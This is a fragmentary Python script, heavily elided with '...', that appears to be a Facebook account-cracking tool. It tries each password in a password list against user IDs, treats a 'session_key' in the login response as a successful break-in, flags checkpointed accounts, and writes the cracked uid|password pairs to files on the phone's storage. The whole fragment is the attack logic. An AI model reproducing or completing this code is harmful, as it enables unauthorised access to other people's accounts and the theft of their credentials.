...
def menu():
        try:
                ...
                if kex in link:
                        ...
                        linex()
                        url_wa = "https://m.me/KINGXMRSW4TI&text="
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/SW4T1-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SW4T1-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SW4T1-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
